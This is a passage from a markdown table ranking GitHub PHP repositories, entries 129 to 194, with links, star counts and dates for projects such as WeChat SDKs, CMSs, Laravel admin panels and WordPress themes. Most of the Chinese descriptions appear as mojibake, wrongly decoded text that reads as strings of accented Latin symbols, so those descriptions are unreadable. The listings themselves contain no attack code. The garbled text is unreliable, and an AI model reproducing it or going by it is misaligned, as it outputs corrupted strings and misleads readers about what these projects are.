|129|[gaoming13/wechat-php-sdk](https://github.com/gaoming13/wechat-php-sdk)|ÂæÆ‰ø°ÂÖ¨‰ºóÂπ≥Âè∞phpÁâàÂºÄÂèëÂåÖ|310|PHP|06/25|
|130|[liufee/yii2-swoole](https://github.com/liufee/yii2-swoole)|yii2 swooleÔºåËÆ©yii2ËøêË°åÂú®swoole‰∏ä|307|PHP|09/02|
|131|[Yurunsoft/YurunOAuthLogin](https://github.com/Yurunsoft/YurunOAuthLogin)|PHP Á¨¨‰∏âÊñπÁôªÂΩïÊéàÊùÉ SDKÔºåÈõÜÊàê‰∫ÜQQ„ÄÅÂæÆ‰ø°„ÄÅÂæÆÂçö„ÄÅGithubÁ≠âÂ∏∏Áî®Êé•Âè£„ÄÇÊîØÊåÅ php-fpm Âíå SwooleÔºåÊâÄÊúâÊ°ÜÊû∂ÈÄöÁî®„ÄÇQQÁæ§Ôºö17916227|305|PHP|05/28|
|132|[inhere/php-console](https://github.com/inhere/php-console)|üñ• PHP CLI application library, provide console argument parse, console controller/command run, color style, user interactive, format information show and more.  ÂäüËÉΩÂÖ®Èù¢ÁöÑPHPÂëΩ‰ª§Ë°åÂ∫îÁî®Â∫ì„ÄÇÊèê‰æõÊéßÂà∂Âè∞ÂèÇÊï∞Ëß£Êûê, ÂëΩ‰ª§ËøêË°åÔºåÈ¢úËâ≤È£éÊ†ºËæìÂá∫, Áî®Êà∑‰ø°ÊÅØ‰∫§‰∫í, ÁâπÊÆäÊ†ºÂºè‰ø°ÊÅØÊòæÁ§∫|302|PHP|10/23|
|133|[lkeme/BiliHelper-personal](https://github.com/lkeme/BiliHelper-personal)|ÔºàBilibiliÔºâB Á´ôËá™Âä®È¢ÜÁìúÂ≠ê„ÄÅÁõ¥Êí≠Âä©Êâã„ÄÅÁõ¥Êí≠ÊåÇÊú∫ËÑöÊú¨„ÄÅ‰∏ªÁ´ôÂä©Êâã - PHP ÁâàÔºàPersonalÔºâ|299|PHP|08/26|
|134|[czewail/think-api](https://github.com/czewail/think-api)|Â∏ÆÂä© thinkphp 5 ÂºÄÂèëËÄÖÂø´ÈÄü„ÄÅËΩªÊùæÁöÑÊûÑÂª∫Apiüéâüéâüéâ|297|PHP|09/22|
|135|[KomaBeyond/chinese-poetry-mysql](https://github.com/KomaBeyond/chinese-poetry-mysql)|Âü∫‰∫é chinese-poetry Êï∞ÊçÆÊï¥ÁêÜÁöÑ‰∏Ä‰ªΩ mysql Ê†ºÂºèÊï∞ÊçÆ|295|PHP|07/22|
|136|[jianyan74/TinyShop](https://github.com/jianyan74/TinyShop)|‰∏ÄÊ¨æÂü∫‰∫é RageFrame2 ÁöÑÂÖçË¥πÂºÄÊ∫êÁöÑÂü∫Á°ÄÈîÄÂîÆÂäüËÉΩÁöÑÂïÜÂüé|295|PHP|09/21|
|137|[largezhou/admin](https://github.com/largezhou/admin)|laravel + ant design vue ÊùÉÈôêÂêéÂè∞|287|PHP|09/10|
|138|[gyxuehu/EwoMail](https://github.com/gyxuehu/EwoMail)|EwoMailÊòØÂü∫‰∫éLinuxÁöÑ‰ºÅ‰∏öÈÇÆÁÆ±ÊúçÂä°Âô®ÔºåÈõÜÊàê‰∫Ü‰ºóÂ§ö‰ºòÁßÄÁ®≥ÂÆöÁöÑÁªÑ‰ª∂ÔºåÊòØ‰∏Ä‰∏™Âø´ÈÄüÈÉ®ÁΩ≤„ÄÅÁÆÄÂçïÈ´òÊïà„ÄÅÂ§öËØ≠Ë®Ä„ÄÅÂÆâÂÖ®Á®≥ÂÆöÁöÑÈÇÆ‰ª∂Ëß£ÂÜ≥ÊñπÊ°à|285|PHP|10/23|
|139|[ennnnny/tbk](https://github.com/ennnnny/tbk)|ÂèØËÉΩÊòØÊúÄ‰ºòÈõÖ„ÄÅÁÆÄÊòìÁöÑÊ∑òÂÆùÂÆ¢SDK|283|PHP|07/19|
|140|[baigoStudio/baigoSSO](https://github.com/baigoStudio/baigoSSO)|ÂçïÁÇπÁôªÂΩïÁ≥ªÁªü|281|PHP|07/08|
|141|[fbtopcn/fatratcollect](https://github.com/fbtopcn/fatratcollect)|ËÉñÈº†ÈááÈõÜ WordPress‰ºòÁßÄÂºÄÊ∫êÈááÈõÜÊèí‰ª∂|277|PHP|10/28|
|142|[mirai-mamori/Sakurairo](https://github.com/mirai-mamori/Sakurairo)|‰∏Ä‰∏™Â§öÂΩ©ÔºåËΩªÊùæ‰∏äÊâãÔºå‰ΩìÈ™åÂÆåÂñÑÔºåÂÖ∑ÊúâÂº∫Â§ßËá™ÂÆö‰πâÂäüËÉΩÁöÑWordPress‰∏ªÈ¢òÔºàÂü∫‰∫éSakura‰∏ªÈ¢òÔºâA Colorful, Easy-to-use, Perfect Experience, and Powerful Customizable WordPress Theme (Based on Theme Sakura)|267|PHP|10/26|
|143|[DasSecurity-Labs/AoiAWD](https://github.com/DasSecurity-Labs/AoiAWD)|AoiAWD-‰∏ì‰∏∫ÊØîËµõËÆæËÆ°Ôºå‰æøÊê∫ÊÄßÂ•ΩÔºå‰ΩéÊùÉÈôêËøêË°åÁöÑEDRÁ≥ªÁªü„ÄÇ|266|PHP|10/18|
|144|[Licoy/wordpress-theme-puock](https://github.com/Licoy/wordpress-theme-puock)|:art: ‰∏ÄÊ¨æÂü∫‰∫éWordPressÂºÄÂèëÁöÑÈ´òÈ¢úÂÄºÁöÑËá™ÈÄÇÂ∫î‰∏ªÈ¢òÔºåÊîØÊåÅÁôΩÂ§©‰∏éÈªëÂ§úÊ®°Âºè„ÄÅÊó†Âà∑Êñ∞Âä†ËΩΩÁ≠â„ÄÇ|265|PHP|10/20|
|145|[eddy8/LightCMS](https://github.com/eddy8/LightCMS)|LightCMSÊòØ‰∏Ä‰∏™Âü∫‰∫éLaravelÂºÄÂèëÁöÑËΩªÈáèÁ∫ßCMSÁ≥ªÁªüÔºå‰πüÂèØ‰ª•‰Ωú‰∏∫‰∏Ä‰∏™ÈÄöÁî®ÁöÑÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂‰ΩøÁî®„ÄÇ|258|PHP|10/23|
|146|[hisiphp/hisiphp](https://github.com/hisiphp/hisiphp)|HisiPHP V2ÁâàÊòØÂü∫‰∫éThinkPHP5.1ÂíåLayuiÂºÄÂèëÁöÑÂêéÂè∞Ê°ÜÊû∂ÔºåÊâøËØ∫Ê∞∏‰πÖÂÖçË¥πÂºÄÊ∫êÔºåÊÇ®ÂèØÁî®‰∫éÂ≠¶‰π†ÂíåÂïÜÁî®Ôºå‰ΩÜÈ°ª‰øùÁïôÁâàÊùÉ‰ø°ÊÅØÊ≠£Â∏∏ÊòæÁ§∫„ÄÇÂ¶ÇÊûúHisiPHPÂØπÊÇ®ÊúâÂ∏ÆÂä©ÔºåÊÇ®ÂèØ‰ª•ÁÇπÂáªÂè≥‰∏äËßí ""Star"" ÊîØÊåÅ‰∏Ä‰∏ãÂì¶ÔºåË∞¢Ë∞¢ÔºÅ|257|PHP|09/28|
|147|[zhaocong6/lock](https://github.com/zhaocong6/lock)|È´òÊÄßËÉΩÂàÜÂ∏ÉÂºèÂπ∂ÂèëÈîÅ, Ë°å‰∏∫ÈôêÊµÅ|255|PHP|07/30|
|148|[GallopYD/domain-tool](https://github.com/GallopYD/domain-tool)|ÂæÆ‰ø°ÂüüÂêçÊã¶Êà™Ê£ÄÊµã„ÄÅQQÂüüÂêçÊã¶Êà™Ê£ÄÊµã„ÄÅÂüüÂêçWhoisÊü•ËØ¢Ôºöhttp://t.eson.vip ÔºåÊü•ËØ¢ÊúâÁºìÂ≠òÔºåÂ¶ÇÈúÄÂÆûÊó∂Êü•ËØ¢ËØ∑Ëá™Ë°åÈÉ®ÁΩ≤|255|PHP|03/03|
|149|[txperl/Story-for-Typecho](https://github.com/txperl/Story-for-Typecho)|Typecho Theme Story - Áà±‰∏ä‰Ω†ÊàëÁöÑÊïÖ‰∫ã|254|PHP|08/04|
|150|[penghcheng/hyperf-admin](https://github.com/penghcheng/hyperf-admin)|Hyperf-admin Âü∫‰∫éHyperf„ÄÅElement-UI ÈÄöÁî®ÁÆ°ÁêÜÂêéÂè∞|252|PHP|09/05|
|151|[klsf/kldns](https://github.com/klsf/kldns)|Âø´‰πê‰∫åÁ∫ßÂüüÂêçÂàÜÂèëÁ≥ªÁªü|251|PHP|09/08|
|152|[ijry/uniadmin](https://github.com/ijry/uniadmin)|UniAdminÊòØ‰∏ÄÂ•óÊ∏êËøõÂºèÊ®°ÂùóÂåñÂºÄÊ∫êÂêéÂè∞ÔºåÈááÁî®ÂâçÂêéÁ´ØÂàÜÁ¶ªÊäÄÊúØÔºåÊï∞ÊçÆ‰∫§‰∫íÈááÁî®jsonÊ†ºÂºèÔºåÂäüËÉΩ‰ΩéËÄ¶ÂêàÈ´òÂÜÖËÅöÔºõÊ†∏ÂøÉÊ®°ÂùóÊîØÊåÅÁ≥ªÁªüËÆæÁΩÆ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅÁî®Êà∑ÁÆ°ÁêÜ„ÄÅËèúÂçïÁÆ°ÁêÜ„ÄÅAPIÁÆ°ÁêÜÁ≠âÂäüËÉΩÔºåÂêéÊúü‰∏äÁ∫øÊ®°ÂùóÂïÜÂüéÂ∞ÜÊâìÈÄ†Á±ª‰ººcomposer„ÄÅnpmÁöÑÂºÄÊîæÂºèÊèí‰ª∂Â∏ÇÂú∫ÔºõÂêåÊó∂Êàë‰ª¨Â∞ÜÊâìÈÄ†‰∏ÄÂ•óÂÖºÂÆπÊÄßÁöÑAPIÊ†áÂáÜÔºå‰ªéThinkPHP5.1+Vue2ÂºÄÂßãÔºåÈÄêÊ≠•Âê∏ÂºïÁà±Â•ΩËÄÖÂÖ±ÂêåÂä†ÂÖ•Ôºå‰ª•Ë¶ÜÁõñlarval„ÄÅspring-boot„ÄÅdjango„ÄÅyii„ÄÅkoa„ÄÅreactÁ≠âÂ§öËØ≠Ë®ÄÊ°ÜÊû∂„ÄÇ|250|PHP|10/29|
|153|[zoujingli/ip2region](https://github.com/zoujingli/ip2region)|ÂáÜÁ°ÆÁéá99.9%ÁöÑipÂú∞ÂùÄÂÆö‰ΩçÂ∫ì|248|PHP|07/06|
|154|[bugaosuni59/TH-CPL](https://github.com/bugaosuni59/TH-CPL)|Ê∏ÖÂçéÂ§ßÂ≠¶ËÆ°ÁÆóÊú∫Â≠¶ÁßëÊé®ËçêÂ≠¶ÊúØ‰ºöËÆÆÂíåÊúüÂàäÂàóË°®|245|PHP|10/12|
|155|[lea21st/LeaCMF](https://github.com/lea21st/LeaCMF)|leacmfÊòØ‰∏ÄÊ¨æÂü∫‰∫éThinkPHP5.1+layuiÁöÑÊûÅÈÄüÂêéÂè∞ÂíåapiÂºÄÂèëÊ°ÜÊû∂„ÄÇ|244|PHP|10/17|
|156|[idreamsoft/iCMS](https://github.com/idreamsoft/iCMS)|iCMS ÊòØ‰∏ÄÂ•óÈááÁî® PHP Âíå MySQL ÊûÑÂª∫ÁöÑÈ´òÊïàÁÆÄÊ¥ÅÁöÑÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü,‰∏∫ÊÇ®ÁöÑÁΩëÁ´ôÊèê‰æõ‰∏Ä‰∏™ÂÆåÁæéÁöÑÂºÄÊ∫êËß£ÂÜ≥ÊñπÊ°à|244|PHP|08/14|
|157|[apanly/mooc](https://github.com/apanly/mooc)|ÊÖïËØæÂπ≥Âè∞ÂΩïËØæËØ¥ÊòéÊñá‰ª∂|244|PHP|02/21|
|158|[SmallRuralDog/laravel-vue-admin](https://github.com/SmallRuralDog/laravel-vue-admin)|ÂºÄÁÆ±Âç≥Áî®ÁöÑLaravelÂêéÂè∞Êâ©Â±ï,ÂâçÂêéÁ´ØÂàÜÁ¶ªÔºåÂêéÁ´ØÊéßÂà∂ÂâçÁ´ØÁªÑ‰ª∂ÔºåÊó†ÈúÄÁºñÂÜôvueÂç≥ÂèØÂàõÂª∫‰∏Ä‰∏™vue+vuex+vue-route+elment-ui+laravelÁöÑÈ°πÁõÆ ,‰∏∞ÂØåÁöÑË°®Âçï Ë°®Ê†ºÁªÑ‰ª∂ÔºåÂº∫Â§ßÁöÑËá™ÂÆö‰πâÁªÑ‰ª∂ÂäüËÉΩ„ÄÇ|235|PHP|10/17|
|159|[coffeehb/tools](https://github.com/coffeehb/tools)|‰∏Ä‰∫õÂÆûÁî®ÁöÑpythonËÑöÊú¨|234|PHP|09/29|
|160|[idoubi/douchat](https://github.com/idoubi/douchat)|ÁÆÄÊ¥Å„ÄÅÈ´òÊïàÁöÑÂæÆ‰ø°ÂºÄÂèëÊ°ÜÊû∂„ÄÇ|234|PHP|02/06|
|161|[html580/diygw](https://github.com/html580/diygw)|Diygw For PHP ÊòØDIYÂÆòÁΩëÊâìÈÄ†Âü∫‰∫éThinkphp 5.1.xÂºÄÂèëÂÆûÊó∂ÂêåÊ≠•DIYÂÆòÁΩëËÆæËÆ°Â∫îÁî®ÔºåÊó†ÈúÄË¶Å‰∏ãËΩΩÁõ¥Êé•Âú®Á∫øÂêåÊ≠•Â∫îÁî®Êõ¥Êñ∞Â∫îÁî®„ÄÇDIYÂÆòÁΩëÊòØ‰∏ÄÊ¨æÁöÑÂèØËßÜÂåñWebÂ∫îÁî®ÂºÄÂèëÂíåËøêË°åÂπ≥Âè∞„ÄÇÂü∫‰∫éÊµèËßàÂô®ÁöÑÈõÜÊàêÂºÄÂèëÁéØÂ¢ÉÔºåÂèØËßÜÂåñÂíåÊô∫ËÉΩÂåñÁöÑËÆæËÆ°ÔºåËÉΩËΩªÊùæÂÆåÊàêË∫´ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂíåÈù¢ÂêëÊâãÊú∫ÁöÑÁßªÂä®Â∫îÁî®ÂºÄÂèëÔºõÈ´òÊïà„ÄÅÁ®≥ÂÆöÂíåÂèØÊâ©Â±ïÁöÑÁâπÁÇπÔºå‰ΩøÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁöÑÂºÄÂèëÊõ¥Âø´Êç∑ÂíåÁÆÄÂçï„ÄÇÊ≠§Ê°ÜÊû∂‰ΩúÁî®‰∫éÂêåÊ≠•DIYÂÆòÁΩëËÆæËÆ°ÁöÑÂ∫îÁî®Ëá≥‰Ω†ÁöÑÊúçÂä°Âô®Ôºå‰∏çÂåÖÊã¨ÂèØËßÜÂåñËÆæËÆ°!|232|PHP|02/29|
|162|[oubingbing/wechatAlliance](https://github.com/oubingbing/wechatAlliance)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è--Ê†°Âõ≠Â∞èÊÉÖ‰π¶ÂêéÂè∞Ê∫êÁ†ÅÔºåÂ•ΩÁé©ÁöÑË°®ÁôΩÂ¢ôÔºåÂëäÁôΩÂ¢ô„ÄÇ|232|PHP|10/29|
|163|[qinggan/phpok](https://github.com/qinggan/phpok)|ËøôÊòØ‰∏ÄÂ•óÊûÅÂÖ∂Ëá™Áî±ÁöÑ‰ºÅ‰∏öÁ´ôÁ®ãÂ∫èÔºåÊîØÊåÅÂêÑÁßçËá™ÂÆö‰πâÈÖçÁΩÆÔºåÂåÖÊã¨Á´ôÁÇπÂÖ®Â±ÄÂèÇÊï∞ÔºåÂàÜÁ±ªÊâ©Â±ïÔºåÈ°πÁõÆÊâ©Â±ïÂèäÂêÑÁßçÊ®°ÂûãÔºÅ|228|PHP|10/28|
|164|[sulianapp-com/sulianapp](https://github.com/sulianapp-com/sulianapp)|Âø´ÈìæÁîµÂïÜÔºåÁõ¥Êí≠ÁîµÂïÜ ÂàÜÈîÄÂïÜÂüé ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüé + APPÂïÜÂüé + ÂÖ¨‰ºóÂè∑ÂïÜÂüé + PCÂïÜÂüéÁ≥ªÁªü + ÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫èÂïÜÂüé + ÊäñÈü≥Â∞èÁ®ãÂ∫èÂïÜÂüé + ÁôæÂ∫¶Â∞èÁ®ãÂ∫èÁîµÂïÜÁ≥ªÁªüÔºàÂâçÂêéÁ´Ø‰ª£Á†ÅÂÖ®ÈÉ®ÂºÄÊ∫êÔºâ Laravel + vueÂºÄÂèëÔºåÊàêÁÜüÂïÜÁî®È°πÁõÆ shop mall ÂïÜÂüé ÁîµÂïÜ |227|PHP|04/06|
|165|[kasuganosoras/Pigeon](https://github.com/kasuganosoras/Pigeon)|üí¨ ‰∏Ä‰∏™ËΩªÈáèÂåñÁöÑÁïôË®ÄÊùø / ËÆ∞‰∫ãÊú¨ / Á§æ‰∫§Á≥ªÁªü / ÂçöÂÆ¢„ÄÇ‰∫∫Á±ªÁöÑÊú¨Ë¥®ÊòØ‚Ä¶‚Ä¶ÂíïÂíïÂíïÔºü|226|PHP|08/19|
|166|[woann/chat](https://github.com/woann/chat)|Âü∫‰∫élaravelSÂíålayimÁöÑËÅäÂ§©Á≥ªÁªü|225|PHP|05/18|
|167|[bettershop/LaikeTui](https://github.com/bettershop/LaikeTui)|Êù•ÂÆ¢ÁîµÂïÜÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüé + APPÂïÜÂüé + ÂÖ¨‰ºóÂè∑ÂïÜÂüé + PCÂïÜÂüéÁ≥ªÁªü + ÊîØ‰ªòÂÆùÂ∞èÁ®ãÂ∫èÂïÜÂüé + ÊäñÈü≥Â∞èÁ®ãÂ∫èÂïÜÂüé + ÁôæÂ∫¶Â∞èÁ®ãÂ∫èÁîµÂïÜÁ≥ªÁªüÔºàÂâçÂêéÁ´Ø‰ª£Á†ÅÂÖ®ÈÉ®ÂºÄÊ∫êÔºâ Ê≥®ÈáçÁïåÈù¢ÁæéÊÑü‰∏éÁî®Êà∑‰ΩìÈ™åÔºåÊâìÈÄ†Áã¨ÁâπÁîµÂïÜÁ≥ªÁªüÁîüÊÄÅÂúà|224|PHP|10/29|
|168|[we7coreteam/w7-rangine-empty](https://github.com/we7coreteam/w7-rangine-empty)|ËΩØÊìéÊòØÂü∫‰∫é Php 7.2+ Âíå Swoole 4.4+ ÁöÑÈ´òÊÄßËÉΩ„ÄÅÁÆÄÂçïÊòìÁî®ÁöÑÂºÄÂèëÊ°ÜÊû∂„ÄÇÊîØÊåÅÂêåÊó∂Âú® Swoole Server Âíå php-fpm ‰∏§ÁßçÊ®°Âºè‰∏ãËøêË°å„ÄÇÂÜÖÁΩÆ‰∫Ü Http (Swoole, Fpm)ÔºåTcpÔºåWebSocketÔºåProcessÔºåCrontabÊúçÂä°„ÄÇÈõÜÊàê‰∫ÜÂ§ßÈáèÊàêÁÜüÁöÑÁªÑ‰ª∂ÔºåÂèØ‰ª•Áî®‰∫éÊûÑÂª∫È´òÊÄßËÉΩÁöÑWebÁ≥ªÁªü„ÄÅAPI„ÄÅ‰∏≠Èó¥‰ª∂„ÄÅÂü∫Á°ÄÊúçÂä°Á≠âÁ≠â„ÄÇ|224|PHP|10/10|
|169|[MercyCloudTeam/TomatoIDC](https://github.com/MercyCloudTeam/TomatoIDC)| TomatoIDCÊòØ‰∏ÄÊ¨æ‰ª•MITÂçèËÆÆÂºÄÊ∫ê‰∏ªÊú∫ÈîÄÂîÆÁ≥ªÁªüÔºåÂÖ∑Â§áÊòì‰∫éÊâ©Â±ïÁöÑÊèí‰ª∂Á≥ªÁªüÔºåÊ®°ÁâàÁ≥ªÁªüÔºå‰ΩøÁî®Âº∫Â§ßÁöÑLaravelÊ°ÜÊû∂ËøõË°åÈ©±Âä®ÔºåËÉΩÂ∏ÆÂä©‰Ω†ËΩªÊùæÁöÑÊâ©Â±ï‰∏ªÊú∫ÈîÄÂîÆ‰∏öÂä°„ÄÇ|221|PHP|09/08|
|170|[chenbool/wms](https://github.com/chenbool/wms)|php‰ªìÂ∫ìËøõÈîÄÂ≠ò|220|PHP|08/28|
|171|[lmxdawn/vue-admin-php](https://github.com/lmxdawn/vue-admin-php)|Vue-cli3.0 + Element UI + ThinkPHP5.1 + RBACÊùÉÈôê + ÂìçÂ∫îÂºèÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü https://lmxdawn.github.io/vue-admin|217|PHP|06/04|
|172|[DOUBLE-Baller/WebRTC_IM](https://github.com/DOUBLE-Baller/WebRTC_IM)|webrtc Áõ¥Êí≠ËøûÈ∫¶|216|PHP|10/13|
|173|[shixinke/php-ide-helper](https://github.com/shixinke/php-ide-helper)|Yaf„ÄÅyar„ÄÅyac„ÄÅyaconf„ÄÅRedis„ÄÅSwoole„ÄÅmsgpack„ÄÅxhprofÁ≠âPHPÊ°ÜÊû∂ÊàñÊâ©Â±ïÂú®IDE‰∏ãËá™Âä®ËØÜÂà´Á±ª„ÄÅÂ∏∏Èáè„ÄÅËá™Âä®Ë°•ÂÖ®ÊñπÊ≥ïÂêç|214|PHP|04/22|
|174|[inhere/php-validate](https://github.com/inhere/php-validate)|Lightweight and feature-rich PHP validation and filtering library. Support scene grouping, pre-filtering, array checking, custom validators, custom messages. ËΩªÈáè‰∏îÂäüËÉΩ‰∏∞ÂØåÁöÑPHPÈ™åËØÅ„ÄÅËøáÊª§Â∫ì„ÄÇÊîØÊåÅÂú∫ÊôØÂàÜÁªÑÔºåÂâçÁΩÆËøáÊª§ÔºåÊï∞ÁªÑÊ£ÄÊü•ÔºåËá™ÂÆö‰πâÈ™åËØÅÂô®ÔºåËá™ÂÆö‰πâÊ∂àÊÅØ„ÄÇ|215|PHP|06/25|
|175|[shmilylbelva/laykefu](https://github.com/shmilylbelva/laykefu)|thinkphp5+workerman+gatewayworkerÊê≠Âª∫ÁöÑwebimÂÆ¢ÊúçÁ≥ªÁªü/Âç≥Êó∂ÈÄöËÆØ|213|PHP|09/23|
|176|[yzmcms/yzmcms](https://github.com/yzmcms/yzmcms)|YzmCMSÊòØ‰∏ÄÊ¨æÂü∫‰∫éYZMPHPÂºÄÂèëÁöÑ‰∏ÄÂ•óËΩªÈáèÁ∫ßÂºÄÊ∫êÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåYzmCMSÁÆÄÊ¥Å„ÄÅÂÆâÂÖ®„ÄÅÂºÄÊ∫ê„ÄÅÂÆûÁî®ÔºåÂèØËøêË°åÂú®Linux„ÄÅWindows„ÄÅMacOSX„ÄÅSolarisÁ≠âÂêÑÁßçÂπ≥Âè∞‰∏äÔºå‰∏ìÊ≥®‰∏∫ÂÖ¨Âè∏‰ºÅ‰∏ö„ÄÅ‰∏™‰∫∫Á´ôÈïøÂø´ÈÄüÂª∫Á´ôÊèê‰æõËß£ÂÜ≥ÊñπÊ°à„ÄÇ|211|PHP|09/06|
|177|[52admln/vue-questionnaire](https://github.com/52admln/vue-questionnaire)|‰ΩøÁî® Vue + CI ÂºÄÂèëÁöÑÁÆÄÊòìÈóÆÂç∑Ë∞ÉÊü•Á≥ªÁªüÔºåÊºîÁ§∫Ë¥¶Êà∑Ôºöadmin / admin|210|PHP|09/09|
|178|[walkor/live-ascii-camera](https://github.com/walkor/live-ascii-camera)|Âà©Áî®HTML5Â∞ÜÊëÑÂÉèÂ§¥ËßÜÈ¢ëËΩ¨Êç¢‰∏∫asciiÂ≠óÁ¨¶ÔºåÈÄöËøáwebsocketÂÆûÊó∂‰º†ËæìÁªôÂÖ∂ÂÆÉÈ°µÈù¢„ÄÇÊúçÂä°Á´Ø‰ΩøÁî®workerman|208|PHP|04/21|
|179|[likeyun/WeChat-Group-HuoMa](https://github.com/likeyun/WeChat-Group-HuoMa)|ÂæÆ‰ø°Áæ§‰∫åÁª¥Á†ÅÊ¥ªÁ†ÅÂ∑•ÂÖ∑ÔºåÁîüÊàêÂæÆ‰ø°Áæ§Ê¥ªÁ†ÅÔºåÈöèÊó∂ÂèØ‰ª•ÂàáÊç¢‰∫åÁª¥Á†ÅÔºÅ|206|PHP|10/13|
|180|[Hanson/weibot](https://github.com/Hanson/weibot)|ÂæÆÂçöÁà¨Ëô´ÔºåÊ®°ÊãüÁôªÂΩïÔºåÊï∞ÊçÆÊäìÂèñ|205|PHP|03/07|
|181|[comdan66/weather](https://github.com/comdan66/weather)|Taiwan's  Weather Maps! ÊÉ≥Êü•Ë©¢ÊØèÂÄãÂú∞ÊñπÁöÑÂ§©Ê∞£ÂóéÔºÅÔºüËóâÁî± Google Maps API ÁöÑÂú∞ÂúñÊúçÂãôÔºå‰ª•Âèä‰∏≠Â§ÆÊ∞£Ë±°Â±ÄÁ∂≤Á´ôÁöÑÂ§©Ê∞£È†êÂ†±ÔºåËÆì‰Ω†Âø´ÈÄüËºïÈ¨ÜÁöÑÊü•Ë©¢Âè∞ÁÅ£ 368 ÂÄãÈÑâÈéÆÁöÑÂ§©Ê∞£Ê¶ÇÊ≥ÅÔºÅ|204|PHP|04/06|
|182|[Seevil/cactus](https://github.com/Seevil/cactus)|üåµ‰∏Ä‰∏™ÂìçÂ∫îÂºèÂπ≤ÂáÄÂíåÁÆÄÊ¥Å‰ºòÈõÖÁöÑ Typecho ‰∏ªÈ¢ò|204|PHP|08/19|
|183|[Clago/workflow](https://github.com/Clago/workflow)|Âü∫‰∫élaravelÁöÑÂ∑•‰ΩúÊµÅÈ°πÁõÆ|203|PHP|09/04|
|184|[zhongshaofa/easyadmin](https://github.com/zhongshaofa/easyadmin)|Ê°ÜÊû∂‰∏ªË¶Å‰ΩøÁî®ThinkPHP6.0 + layuiÔºåÊã•ÊúâÂÆåÂñÑÁöÑÊùÉÈôêÁöÑÁÆ°ÁêÜÊ®°Âùó‰ª•ÂèäÊïèÊç∑ÁöÑÂºÄÂèëÊñπÂºèÔºåËÆ©‰Ω†ÂºÄÂèëËµ∑Êù•Êõ¥Âä†ÁöÑËàíÊúç„ÄÇ|203|PHP|10/28|
|185|[jswh/synology_video_station_douban_plugin](https://github.com/jswh/synology_video_station_douban_plugin)|Áæ§Êôñ video station Ë±ÜÁì£ÂàÆÂâäÊèí‰ª∂|201|PHP|04/14|
|186|[myqee/server](https://github.com/myqee/server)|Â∞ÜswooleÊúçÂä°ÂíåÂäüËÉΩÂØπË±°ÊäΩË±°ÂåñÔºåÂ∏¶Êù•ÂÖ®Êñ∞ÁöÑÁºñÁ®ã‰ΩìÈ™åËÆ©‰ª£Á†ÅÊ∏ÖÊô∞ÊúâÊù°ÁêÜÁöÑÁ±ªÂ∫ì|196|PHP|08/03|
|187|[DukeAnn/Laradmin](https://github.com/DukeAnn/Laradmin)|LaradminÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|195|PHP|08/10|
|188|[Innei/Typecho-Theme-Paul](https://github.com/Innei/Typecho-Theme-Paul)|üéà ‰∏Ä‰∏™ÈÄÇÁî®‰∫éÂ±ïÁ§∫ÔºåÂÜôÊó•ËÆ∞ÁöÑ Typecho ÂçöÂÆ¢‰∏ªÈ¢ò„ÄÇ|193|PHP|06/02|
|189|[dedetech/DedeCMSv5](https://github.com/dedetech/DedeCMSv5)|‰∏≠ÂõΩ‰∏ì‰∏öÁöÑPHPÁΩëÁ´ôÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü-ÁªáÊ¢¶ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü|190|PHP|09/21|
|190|[ycrao/mynotes](https://github.com/ycrao/mynotes)|Á¨îËÆ∞„ÄÅLaravel„ÄÅPHP„ÄÅÈù¢ËØïÈ¢ò„ÄÅMySQL„ÄÅHTML„ÄÅCSS„ÄÅJava...|189|PHP|06/03|
|191|[iamxjb/rest-api-to-miniprogram](https://github.com/iamxjb/rest-api-to-miniprogram)|REST API TO MiniProgram ‰∏∫Â∞èÁ®ãÂ∫èÊèê‰æõ rest api ÊîØÊåÅ|188|PHP|09/17|
|192|[yybawang/laravel-ebank](https://github.com/yybawang/laravel-ebank)|:robot: ÁîµÂïÜÁ±ªÁ´ôÂÜÖËôöÊãüÁßØÂàÜ‰∏éËÅöÂêàÊîØ‰ªòËß£ÂÜ≥ÊñπÊ°à|187|PHP|08/21|
|193|[asiacny/zero-width-qrcode-shortener](https://github.com/asiacny/zero-width-qrcode-shortener)|Èõ∂ÂÆΩÂ∫¶Áü≠ÁΩëÂùÄ‰∏é‰∫åÁª¥Á†ÅÁîüÊàêÂ∑•ÂÖ∑(PHP+ORACLE/MYSQL/SQLite)|187|PHP|03/30|
|194|[Yurunsoft/YurunHttp](https://github.com/Yurunsoft/YurunHttp)|YurunHttp ÊòØÂºÄÊ∫êÁöÑ PHP HTTP ÂÆ¢Êà∑Á´ØÔºåÊîØÊåÅÈìæÂºèÊìç‰ΩúÔºåÁÆÄÂçïÊòìÁî®„ÄÇÂÆåÁæéÊîØÊåÅCurl„ÄÅSwoole ÂçèÁ®ã„ÄÇQQÁæ§Ôºö17916227|185|PHP|08/29|
